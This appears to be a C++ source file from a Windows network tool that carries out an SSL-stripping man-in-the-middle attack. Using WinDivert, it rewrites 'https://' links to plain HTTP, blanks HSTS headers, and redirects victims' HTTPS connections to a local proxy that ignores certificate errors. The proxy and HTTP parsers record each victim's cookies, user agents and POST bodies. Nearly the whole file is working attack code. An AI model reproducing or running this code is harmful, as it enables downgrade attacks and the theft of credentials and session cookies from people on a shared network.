// src/SslStripEngine.cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include "SslStripEngine.h"
#include <wininet.h>
#include <iostream>
#include <sstream>
#include <algorithm>
#include <cctype>
#include <cstring>

#pragma comment(lib, "wininet.lib")

SslStripEngine::SslStripEngine()
    : m_httpHandle(INVALID_HANDLE_VALUE), m_natHandle(INVALID_HANDLE_VALUE),
      m_running(false), m_sslStripEnabled(false),
      m_proxySocket(INVALID_SOCKET), m_proxyPort(10080),
      m_captureId(0), m_httpPackets(0), m_strippedCount(0), m_proxiedCount(0) {}

SslStripEngine::~SslStripEngine() {
    stop();
}

// ============================================================================
// Start: HTTP interception + MITM proxy + NAT redirect
// ============================================================================
bool SslStripEngine::start() {
    if (m_running) return true;
    
    // 1. Open WinDivert for HTTP (port 80) traffic — capture & modify
    const char* httpFilter = "tcp.DstPort == 80 or tcp.SrcPort == 80 or tcp.DstPort == 8080 or tcp.SrcPort == 8080";
    m_httpHandle = WinDivertOpen(httpFilter, WINDIVERT_LAYER_NETWORK, 0, 0);
    if (m_httpHandle == INVALID_HANDLE_VALUE) {
        std::cerr << "[SslStrip] HTTP WinDivert failed: " << GetLastError() << std::endl;
        return false;
    }
    
    // 2. Start MITM proxy listener
    m_proxySocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (m_proxySocket == INVALID_SOCKET) {
        WinDivertClose(m_httpHandle);
        m_httpHandle = INVALID_HANDLE_VALUE;
        return false;
    }
    
    // Allow port reuse
    int opt = 1;
    setsockopt(m_proxySocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
    
    struct sockaddr_in proxyAddr = {};
    proxyAddr.sin_family = AF_INET;
    proxyAddr.sin_addr.s_addr = INADDR_ANY;
    proxyAddr.sin_port = htons(m_proxyPort);
    
    if (bind(m_proxySocket, (struct sockaddr*)&proxyAddr, sizeof(proxyAddr)) == SOCKET_ERROR) {
        // Try alternative port
        m_proxyPort = 10081;
        proxyAddr.sin_port = htons(m_proxyPort);
        if (bind(m_proxySocket, (struct sockaddr*)&proxyAddr, sizeof(proxyAddr)) == SOCKET_ERROR) {
            closesocket(m_proxySocket);
            m_proxySocket = INVALID_SOCKET;
            WinDivertClose(m_httpHandle);
            m_httpHandle = INVALID_HANDLE_VALUE;
            return false;
        }
    }
    
    listen(m_proxySocket, 32);
    
    // Set non-blocking accept timeout
    DWORD timeout = 1000;
    setsockopt(m_proxySocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    
    m_running = true;
    m_startTime = std::chrono::steady_clock::now();
    
    // Launch threads
    m_httpWorker = std::thread(&SslStripEngine::httpInterceptionLoop, this);
    m_proxyWorker = std::thread(&SslStripEngine::proxyListenerLoop, this);
    
    return true;
}

void SslStripEngine::stop() {
    m_running = false;
    m_sslStripEnabled = false;
    
    if (m_httpHandle != INVALID_HANDLE_VALUE) {
        WinDivertClose(m_httpHandle);
        m_httpHandle = INVALID_HANDLE_VALUE;
    }
    if (m_natHandle != INVALID_HANDLE_VALUE) {
        WinDivertClose(m_natHandle);
        m_natHandle = INVALID_HANDLE_VALUE;
    }
    if (m_proxySocket != INVALID_SOCKET) {
        closesocket(m_proxySocket);
        m_proxySocket = INVALID_SOCKET;
    }
    
    if (m_httpWorker.joinable()) m_httpWorker.join();
    if (m_natWorker.joinable()) m_natWorker.join();
    if (m_proxyWorker.joinable()) m_proxyWorker.join();
}

void SslStripEngine::enableSslStrip(bool enable) {
    if (enable && !m_sslStripEnabled) {
        // Start NAT redirect when SSL strip is enabled
        if (m_natHandle == INVALID_HANDLE_VALUE) {
            // Capture outbound HTTPS SYN packets from victims
            const char* natFilter = "outbound and tcp.DstPort == 443 and tcp.Syn and !tcp.Ack";
            m_natHandle = WinDivertOpen(natFilter, WINDIVERT_LAYER_NETWORK, -1, 0);
            if (m_natHandle != INVALID_HANDLE_VALUE && !m_natWorker.joinable()) {
                m_natWorker = std::thread(&SslStripEngine::natRedirectLoop, this);
            }
        }
    }
    m_sslStripEnabled = enable;
}

// ============================================================================
// Capture helpers
// ============================================================================
void SslStripEngine::addCapture(HttpCapture&& cap) {
    std::lock_guard<std::mutex> lock(m_captureMutex);
    m_captures.push_back(std::move(cap));
    while (m_captures.size() > MAX_CAPTURES) m_captures.pop_front();
}

std::vector<HttpCapture> SslStripEngine::getCaptures(int maxCount) const {
    std::lock_guard<std::mutex> lock(m_captureMutex);
    std::vector<HttpCapture> result;
    int start = (int)m_captures.size() - maxCount;
    if (start < 0) start = 0;
    for (int i = start; i < (int)m_captures.size(); ++i) {
        result.push_back(m_captures[i]);
    }
    return result;
}

void SslStripEngine::clearCaptures() {
    std::lock_guard<std::mutex> lock(m_captureMutex);
    m_captures.clear();
    m_captureId = 0;
    m_httpPackets = 0;
    m_strippedCount = 0;
    m_proxiedCount = 0;
}

size_t SslStripEngine::getCaptureCount() const {
    std::lock_guard<std::mutex> lock(m_captureMutex);
    return m_captures.size();
}

// ============================================================================
// HTTP Interception Loop — captures port 80 traffic, modifies responses
// ============================================================================
void SslStripEngine::httpInterceptionLoop() {
    uint8_t packet[65535];
    UINT packetLen;
    WINDIVERT_ADDRESS addr;

    while (m_running) {
        if (!WinDivertRecv(m_httpHandle, packet, sizeof(packet), &packetLen, &addr)) {
            if (!m_running) break;
            continue;
        }

        PWINDIVERT_IPHDR ipHdr = nullptr;
        PWINDIVERT_TCPHDR tcpHdr = nullptr;
        uint8_t* payload = nullptr;
        UINT payloadLen = 0;
        
        WinDivertHelperParsePacket(packet, packetLen,
            &ipHdr, nullptr, nullptr, nullptr, nullptr,
            &tcpHdr, nullptr, (PVOID*)&payload, &payloadLen, nullptr, nullptr);

        if (ipHdr && tcpHdr && payload && payloadLen > 0) {
            struct in_addr sa, da;
            sa.S_un.S_addr = ipHdr->SrcAddr;
            da.S_un.S_addr = ipHdr->DstAddr;
            std::string srcIp = inet_ntoa(sa);
            std::string dstIp = inet_ntoa(da);
            uint16_t srcPort = ntohs(tcpHdr->SrcPort);
            uint16_t dstPort = ntohs(tcpHdr->DstPort);
            
            double ts = std::chrono::duration<double>(
                std::chrono::steady_clock::now() - m_startTime).count();

            m_httpPackets++;

            bool isRequest = (dstPort == 80 || dstPort == 8080);
            bool isResponse = (srcPort == 80 || srcPort == 8080);

            if (isRequest && payloadLen > 4) {
                parseHttpRequest(payload, payloadLen, srcIp, dstIp, srcPort, dstPort, ts);
            }
            if (isResponse && payloadLen > 12) {
                parseHttpResponse(payload, payloadLen, srcIp, dstIp, srcPort, dstPort, ts);
                
                // SSL Strip: replace https→http in HTTP responses
                if (m_sslStripEnabled && payloadLen > 20) {
                    uint32_t newLen = payloadLen;
                    int stripped = stripHttpsFromPayload(payload, newLen, payloadLen);
                    if (stripped > 0) {
                        m_strippedCount += stripped;
                        WinDivertHelperCalcChecksums(packet, packetLen, &addr, 0);
                    }
                }
            }
        }

        // Re-inject packet
        WinDivertSend(m_httpHandle, packet, packetLen, nullptr, &addr);
    }
}

// ============================================================================
// NAT Redirect Loop — redirects victim HTTPS SYN to our local MITM proxy
// Implements transparent proxy via WinDivert packet modification
// ============================================================================
void SslStripEngine::natRedirectLoop() {
    uint8_t packet[65535];
    UINT packetLen;
    WINDIVERT_ADDRESS addr;

    while (m_running && m_sslStripEnabled) {
        if (m_natHandle == INVALID_HANDLE_VALUE) break;
        
        if (!WinDivertRecv(m_natHandle, packet, sizeof(packet), &packetLen, &addr)) {
            if (!m_running || !m_sslStripEnabled) break;
            continue;
        }

        PWINDIVERT_IPHDR ipHdr = nullptr;
        PWINDIVERT_TCPHDR tcpHdr = nullptr;
        
        WinDivertHelperParsePacket(packet, packetLen,
            &ipHdr, nullptr, nullptr, nullptr, nullptr,
            &tcpHdr, nullptr, nullptr, nullptr, nullptr, nullptr);

        if (ipHdr && tcpHdr) {
            // Store NAT mapping: original connection → our proxy
            uint64_t key = ((uint64_t)ipHdr->SrcAddr << 16) | ntohs(tcpHdr->SrcPort);
            
            NatEntry entry;
            entry.clientIp = ipHdr->SrcAddr;
            entry.clientPort = ntohs(tcpHdr->SrcPort);
            entry.origServerIp = ipHdr->DstAddr;
            entry.origServerPort = ntohs(tcpHdr->DstPort);
            entry.created = std::chrono::steady_clock::now();
            
            {
                std::lock_guard<std::mutex> lock(m_natMutex);
                m_natTable[key] = entry;
                
                // Clean old entries (> 5 min)
                auto now = std::chrono::steady_clock::now();
                for (auto it = m_natTable.begin(); it != m_natTable.end(); ) {
                    if (std::chrono::duration<double>(now - it->second.created).count() > 300.0) {
                        it = m_natTable.erase(it);
                    } else {
                        ++it;
                    }
                }
            }

            // Redirect: change destination to our local proxy
            // Keep original source so proxy can identify the client
            struct in_addr localAddr;
            localAddr.S_un.S_addr = ipHdr->SrcAddr; // Will use loopback
            
            // Modify packet: dst → 127.0.0.1:proxyPort
            ipHdr->DstAddr = inet_addr("127.0.0.1");
            tcpHdr->DstPort = htons(m_proxyPort);
            
            // Recalculate checksums
            WinDivertHelperCalcChecksums(packet, packetLen, &addr, 0);
            
            // Re-inject modified packet (now goes to our proxy)
            addr.Outbound = 0; // Make it inbound to reach our local proxy
            WinDivertSend(m_natHandle, packet, packetLen, nullptr, &addr);
            
            // Log the redirect
            struct in_addr origDst;
            origDst.S_un.S_addr = entry.origServerIp;
            
            HttpCapture cap;
            cap.id = ++m_captureId;
            cap.timestamp = std::chrono::duration<double>(
                std::chrono::steady_clock::now() - m_startTime).count();
            cap.srcIp = inet_ntoa(*(struct in_addr*)&entry.clientIp);
            cap.dstIp = inet_ntoa(origDst);
            cap.srcPort = entry.clientPort;
            cap.dstPort = entry.origServerPort;
            cap.method = "HTTPS";
            cap.fullUrl = "https://" + cap.dstIp + ":443 → MITM proxy";
            cap.host = cap.dstIp;
            cap.isResponse = false;
            cap.statusCode = 0;
            cap.contentLength = 0;
            cap.wasStripped = true;
            
            addCapture(std::move(cap));
        }
    }
    
    // Clean up NAT handle when strip is disabled
    if (m_natHandle != INVALID_HANDLE_VALUE && !m_sslStripEnabled) {
        WinDivertClose(m_natHandle);
        m_natHandle = INVALID_HANDLE_VALUE;
    }
}

// ============================================================================
// MITM Proxy Listener — accepts redirected connections and proxies via HTTPS
// ============================================================================
void SslStripEngine::proxyListenerLoop() {
    while (m_running) {
        if (m_proxySocket == INVALID_SOCKET) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }
        
        struct sockaddr_in clientAddr;
        int addrLen = sizeof(clientAddr);
        SOCKET clientSock = accept(m_proxySocket, (struct sockaddr*)&clientAddr, &addrLen);
        
        if (clientSock == INVALID_SOCKET) {
            if (!m_running) break;
            continue;
        }
        
        // Determine the original destination from NAT table
        uint64_t key = ((uint64_t)clientAddr.sin_addr.S_un.S_addr << 16) | ntohs(clientAddr.sin_port);
        uint32_t origServerIp = 0;
        uint16_t origServerPort = 443;
        
        {
            std::lock_guard<std::mutex> lock(m_natMutex);
            auto it = m_natTable.find(key);
            if (it != m_natTable.end()) {
                origServerIp = it->second.origServerIp;
                origServerPort = it->second.origServerPort;
            }
        }
        
        if (origServerIp != 0) {
            // Handle in a detached thread
            std::thread(&SslStripEngine::handleProxyConnection, this, clientSock, origServerIp, origServerPort).detach();
        } else {
            // Unknown connection — read HTTP request and proxy via WinInet
            std::thread([this, clientSock]() {
                handleProxyConnection(clientSock, 0, 0);
            }).detach();
        }
    }
}

// ============================================================================
// Handle a single proxied connection: read HTTP from victim, fetch via HTTPS
// ============================================================================
void SslStripEngine::handleProxyConnection(SOCKET clientSock, uint32_t origServerIp, uint16_t origServerPort) {
    // Set timeouts
    DWORD timeout = 10000;
    setsockopt(clientSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(clientSock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    // Read the HTTP request from the victim
    char reqBuf[16384];
    int reqLen = recv(clientSock, reqBuf, sizeof(reqBuf) - 1, 0);
    if (reqLen <= 0) {
        closesocket(clientSock);
        return;
    }
    reqBuf[reqLen] = 0;
    
    // Parse the request to get Host and path
    std::string request(reqBuf, reqLen);
    std::string method, path, host;
    
    // Parse first line: "GET /path HTTP/1.1"
    size_t firstLineEnd = request.find("\r\n");
    if (firstLineEnd != std::string::npos) {
        std::string firstLine = request.substr(0, firstLineEnd);
        size_t sp1 = firstLine.find(' ');
        if (sp1 != std::string::npos) {
            method = firstLine.substr(0, sp1);
            size_t sp2 = firstLine.find(' ', sp1 + 1);
            if (sp2 != std::string::npos) {
                path = firstLine.substr(sp1 + 1, sp2 - sp1 - 1);
            }
        }
    }
    
    // Parse Host header
    size_t hostPos = request.find("Host: ");
    if (hostPos == std::string::npos) hostPos = request.find("host: ");
    if (hostPos != std::string::npos) {
        size_t hostEnd = request.find("\r\n", hostPos);
        if (hostEnd != std::string::npos) {
            host = request.substr(hostPos + 6, hostEnd - hostPos - 6);
        }
    }
    
    if (host.empty() && origServerIp != 0) {
        struct in_addr a;
        a.S_un.S_addr = origServerIp;
        host = inet_ntoa(a);
    }
    
    if (host.empty()) {
        closesocket(clientSock);
        return;
    }
    
    // Log the captured request
    double ts = std::chrono::duration<double>(
        std::chrono::steady_clock::now() - m_startTime).count();
    
    HttpCapture cap;
    cap.id = ++m_captureId;
    cap.timestamp = ts;
    cap.srcIp = "proxy";
    cap.dstIp = host;
    cap.srcPort = 0;
    cap.dstPort = origServerPort;
    cap.method = method;
    cap.host = host;
    cap.path = path;
    cap.fullUrl = "https://" + host + path;
    cap.isResponse = false;
    cap.statusCode = 0;
    cap.contentLength = 0;
    cap.wasStripped = true;
    
    // Extract cookies and user-agent from request
    size_t uaPos = request.find("User-Agent: ");
    if (uaPos == std::string::npos) uaPos = request.find("user-agent: ");
    if (uaPos != std::string::npos) {
        size_t uaEnd = request.find("\r\n", uaPos);
        if (uaEnd != std::string::npos) {
            cap.userAgent = request.substr(uaPos + 12, uaEnd - uaPos - 12);
        }
    }
    
    size_t ckPos = request.find("Cookie: ");
    if (ckPos == std::string::npos) ckPos = request.find("cookie: ");
    if (ckPos != std::string::npos) {
        size_t ckEnd = request.find("\r\n", ckPos);
        if (ckEnd != std::string::npos) {
            cap.cookie = request.substr(ckPos + 8, ckEnd - ckPos - 8);
        }
    }
    
    // Extract POST data
    size_t bodyPos = request.find("\r\n\r\n");
    if (bodyPos != std::string::npos && bodyPos + 4 < request.size()) {
        cap.postData = request.substr(bodyPos + 4, 4096);
    }
    
    addCapture(std::move(cap));
    
    // Now fetch the REAL page via HTTPS using WinInet
    std::string fullUrl = "https://" + host + path;
    
    HINTERNET hInet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                                     INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (!hInet) {
        closesocket(clientSock);
        return;
    }
    
    HINTERNET hUrl = InternetOpenUrlA(hInet, fullUrl.c_str(), nullptr, 0,
        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_UI |
        INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    
    if (!hUrl) {
        // Fall back to HTTP if HTTPS fails
        fullUrl = "http://" + host + path;
        hUrl = InternetOpenUrlA(hInet, fullUrl.c_str(), nullptr, 0,
            INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI, 0);
    }
    
    if (hUrl) {
        // Get response headers
        char headerBuf[4096] = {};
        DWORD headerLen = sizeof(headerBuf) - 1;
        DWORD headerIdx = 0;
        HttpQueryInfoA(hUrl, HTTP_QUERY_RAW_HEADERS_CRLF, headerBuf, &headerLen, &headerIdx);
        
        std::string headers(headerBuf, headerLen);
        
        // Strip HSTS and replace https→http in headers
        std::string modHeaders;
        std::istringstream hss(headers);
        std::string line;
        while (std::getline(hss, line)) {
            if (!line.empty() && line.back() == '\r') line.pop_back();
            // Skip HSTS headers
            if (line.find("Strict-Transport-Security") != std::string::npos) continue;
            // Replace https with http in Location redirects
            size_t pos;
            while ((pos = line.find("https://")) != std::string::npos) {
                line.replace(pos, 8, "http://");
            }
            modHeaders += line + "\r\n";
        }
        
        // Send HTTP response header to victim
        std::string responseStart = "HTTP/1.1 200 OK\r\n";
        // Use modified headers from the real response, or construct minimal ones
        send(clientSock, modHeaders.c_str(), (int)modHeaders.size(), 0);
        send(clientSock, "\r\n", 2, 0);
        
        // Stream the body, stripping https→http as we go
        char bodyBuf[65536];
        DWORD bytesRead;
        while (InternetReadFile(hUrl, bodyBuf, sizeof(bodyBuf) - 1, &bytesRead) && bytesRead > 0) {
            bodyBuf[bytesRead] = 0;
            
            // Strip https→http in body content
            if (m_sslStripEnabled) {
                std::string body(bodyBuf, bytesRead);
                size_t pos;
                while ((pos = body.find("https://")) != std::string::npos) {
                    body.replace(pos, 8, "http://");
                    m_strippedCount++;
                }
                send(clientSock, body.c_str(), (int)body.size(), 0);
            } else {
                send(clientSock, bodyBuf, bytesRead, 0);
            }
        }
        
        InternetCloseHandle(hUrl);
        m_proxiedCount++;
    }
    
    InternetCloseHandle(hInet);
    closesocket(clientSock);
}

// ============================================================================
// Parse HTTP Request
// ============================================================================
void SslStripEngine::parseHttpRequest(const uint8_t* payload, uint32_t len,
    const std::string& srcIp, const std::string& dstIp,
    uint16_t srcPort, uint16_t dstPort, double ts) {
    
    const char* methods[] = { "GET ", "POST ", "PUT ", "DELETE ", "HEAD ", "OPTIONS ", "PATCH ", "CONNECT " };
    bool isHttp = false;
    std::string method;
    for (const char* m : methods) {
        size_t mlen = strlen(m);
        if (len >= mlen && memcmp(payload, m, mlen) == 0) {
            isHttp = true;
            method = std::string(m, mlen - 1);
            break;
        }
    }
    if (!isHttp) return;

    std::string data((const char*)payload, (std::min)(len, (uint32_t)8192));
    
    std::string path;
    size_t firstLineEnd = data.find("\r\n");
    if (firstLineEnd != std::string::npos) {
        std::string line = data.substr(0, firstLineEnd);
        size_t p1 = line.find(' ');
        if (p1 != std::string::npos) {
            size_t p2 = line.find(' ', p1 + 1);
            if (p2 != std::string::npos) {
                path = line.substr(p1 + 1, p2 - p1 - 1);
            }
        }
    }

    HttpCapture cap;
    cap.id = ++m_captureId;
    cap.timestamp = ts;
    cap.srcIp = srcIp;
    cap.dstIp = dstIp;
    cap.srcPort = srcPort;
    cap.dstPort = dstPort;
    cap.method = method;
    cap.path = path;
    cap.isResponse = false;
    cap.statusCode = 0;
    cap.contentLength = 0;
    cap.wasStripped = false;

    size_t pos = (firstLineEnd != std::string::npos) ? firstLineEnd + 2 : 0;
    size_t headerEnd = data.find("\r\n\r\n", pos);
    
    while (pos < data.size() && pos < (headerEnd != std::string::npos ? headerEnd : data.size())) {
        size_t lineEnd = data.find("\r\n", pos);
        if (lineEnd == std::string::npos) break;
        std::string line = data.substr(pos, lineEnd - pos);
        pos = lineEnd + 2;
        if (line.empty()) break;

        size_t colon = line.find(':');
        if (colon == std::string::npos) continue;
        std::string name = line.substr(0, colon);
        std::string value = line.substr(colon + 1);
        size_t vs = value.find_first_not_of(" \t");
        if (vs != std::string::npos) value = value.substr(vs);

        std::string nameLower = name;
        for (char& c : nameLower) c = (char)tolower((unsigned char)c);

        if (nameLower == "host") cap.host = value;
        else if (nameLower == "user-agent") cap.userAgent = value;
        else if (nameLower == "content-type") cap.contentType = value;
        else if (nameLower == "referer" || nameLower == "referrer") cap.referer = value;
        else if (nameLower == "cookie") cap.cookie = value;
        else if (nameLower == "content-length") cap.contentLength = (uint32_t)atoi(value.c_str());
    }

    if (!cap.host.empty()) cap.fullUrl = "http://" + cap.host + path;
    else cap.fullUrl = "http://" + dstIp + path;

    {
        std::lock_guard<std::mutex> lock(m_stripMutex);
        if (m_strippedDomains.count(cap.host)) cap.wasStripped = true;
    }

    if (method == "POST" && headerEnd != std::string::npos && headerEnd + 4 < data.size()) {
        cap.postData = data.substr(headerEnd + 4, 4096);
    }

    addCapture(std::move(cap));
}

// ============================================================================
// Parse HTTP Response
// ============================================================================
void SslStripEngine::parseHttpResponse(const uint8_t* payload, uint32_t len,
    const std::string& srcIp, const std::string& dstIp,
    uint16_t srcPort, uint16_t dstPort, double ts) {
    
    if (len < 12) return;
    if (memcmp(payload, "HTTP/1", 6) != 0 && memcmp(payload, "HTTP/2", 6) != 0) return;

    std::string data((const char*)payload, (std::min)(len, (uint32_t)4096));
    
    HttpCapture cap;
    cap.id = ++m_captureId;
    cap.timestamp = ts;
    cap.srcIp = srcIp;
    cap.dstIp = dstIp;
    cap.srcPort = srcPort;
    cap.dstPort = dstPort;
    cap.isResponse = true;
    cap.wasStripped = false;
    cap.contentLength = 0;

    size_t firstLineEnd = data.find("\r\n");
    if (firstLineEnd != std::string::npos) {
        std::string statusLine = data.substr(0, firstLineEnd);
        size_t sp1 = statusLine.find(' ');
        if (sp1 != std::string::npos) {
            cap.statusCode = atoi(statusLine.c_str() + sp1 + 1);
        }
    }

    size_t pos = (firstLineEnd != std::string::npos) ? firstLineEnd + 2 : 0;
    while (pos < data.size()) {
        size_t lineEnd = data.find("\r\n", pos);
        if (lineEnd == std::string::npos) break;
        std::string line = data.substr(pos, lineEnd - pos);
        pos = lineEnd + 2;
        if (line.empty()) break;

        size_t colon = line.find(':');
        if (colon == std::string::npos) continue;
        std::string name = line.substr(0, colon);
        std::string value = line.substr(colon + 1);
        size_t vs = value.find_first_not_of(" \t");
        if (vs != std::string::npos) value = value.substr(vs);

        std::string nameLower = name;
        for (char& c : nameLower) c = (char)tolower((unsigned char)c);

        if (nameLower == "content-type") cap.contentType = value;
        else if (nameLower == "content-length") cap.contentLength = (uint32_t)atoi(value.c_str());
    }

    cap.method = "RESP";
    cap.fullUrl = std::to_string(cap.statusCode);

    addCapture(std::move(cap));
}

// ============================================================================
// SSL Strip: replace "https://" with " http://" in HTTP response payloads
// ============================================================================
int SslStripEngine::stripHttpsFromPayload(uint8_t* payload, uint32_t& len, uint32_t maxLen) {
    int count = 0;
    
    for (uint32_t i = 0; i + 8 <= len; ++i) {
        if (memcmp(payload + i, "https://", 8) == 0) {
            // Same-length replacement to avoid TCP sequence desync
            memcpy(payload + i, " http://", 8);
            
            uint32_t domStart = i + 8;
            uint32_t domEnd = domStart;
            while (domEnd < len && payload[domEnd] != '/' && payload[domEnd] != '"' && 
                   payload[domEnd] != '\'' && payload[domEnd] != ' ' && payload[domEnd] != '>') {
                domEnd++;
            }
            if (domEnd > domStart) {
                std::string domain((const char*)(payload + domStart), domEnd - domStart);
                std::lock_guard<std::mutex> lock(m_stripMutex);
                m_strippedDomains.insert(domain);
            }
            
            count++;
            i += 7;
        }
    }
    
    // Strip HSTS headers
    const char* hsts = "Strict-Transport-Security";
    size_t hstsLen = strlen(hsts);
    for (uint32_t i = 0; i + hstsLen <= len; ++i) {
        if (_strnicmp((const char*)(payload + i), hsts, hstsLen) == 0) {
            const char* replacement = "X-Stripped-Header______";
            size_t repLen = strlen(replacement);
            if (repLen <= hstsLen) {
                memcpy(payload + i, replacement, repLen);
                for (size_t j = repLen; j < hstsLen; ++j) {
                    payload[i + j] = '_';
                }
            }
            count++;
            break;
        }
    }
    
    return count;
}

// ============================================================================
// Bandwidth Ranking
// ============================================================================
std::vector<BandwidthRank> SslStripEngine::buildBandwidthRanking(
    const std::map<std::string, TrafficStats>& trafficStats,
    const std::string& localIp,
    const std::map<std::string, DeviceInfo>& devices) {
    
    std::vector<BandwidthRank> ranking;
    uint64_t grandTotal = 0;

    for (auto& [ip, stats] : trafficStats) {
        BandwidthRank r;
        r.ip = ip;
        r.totalBytes = stats.bytesIn + stats.bytesOut;
        r.rateMbps = (stats.rateIn + stats.rateOut) * 8.0 / 1000000.0;
        r.isLocal = (ip == localIp);
        
        auto it = devices.find(ip);
        if (it != devices.end()) {
            r.vendor = it->second.vendor;
        }
        
        grandTotal += r.totalBytes;
        ranking.push_back(r);
    }

    for (auto& r : ranking) {
        r.percentOfTotal = (grandTotal > 0) ? (r.totalBytes * 100.0 / grandTotal) : 0.0;
    }

    std::sort(ranking.begin(), ranking.end(), [](const BandwidthRank& a, const BandwidthRank& b) {
        return a.totalBytes > b.totalBytes;
    });

    return ranking;
}
